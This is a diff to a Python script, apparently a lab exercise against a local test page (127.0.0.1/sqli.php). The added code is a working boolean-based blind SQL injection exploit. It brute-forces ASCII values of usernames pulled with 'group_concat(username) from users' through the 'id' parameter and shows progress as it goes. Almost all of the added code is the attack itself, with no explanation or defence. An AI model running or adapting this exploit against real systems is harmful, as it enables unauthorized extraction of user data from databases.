@@ -19,9 +19,32 @@ signal.signal(signal.SIGINT, def_handler)
 
 # Variables globales
 URL = "http://127.0.0.1/sqli.php"
+CHARACTERS = string.printable
 
 
 def make_SQLI():
+    p1 = log.progress("Brute Force")
+    p1.status("Loading")
+    time.sleep(2)
+
+    p2 = log.progress("Extracted data")
+
+    extracted_info = ""
+
+    for name_char_pos in range(1, 33):
+        for char in range(33, 127):
+            sqli_url = URL + \
+                "?id=9 or ascii(substring((select group_concat(username) from users), {}, 1)) = {}".format(
+                    name_char_pos, char)
+
+            p1.status(sqli_url)
+
+            response = requests.get(sqli_url)
+
+            if response.status_code == 200:
+                extracted_info += chr(char)
+                p2.status(extracted_info)
+                break
 
 
 if __name__ == '__main__':
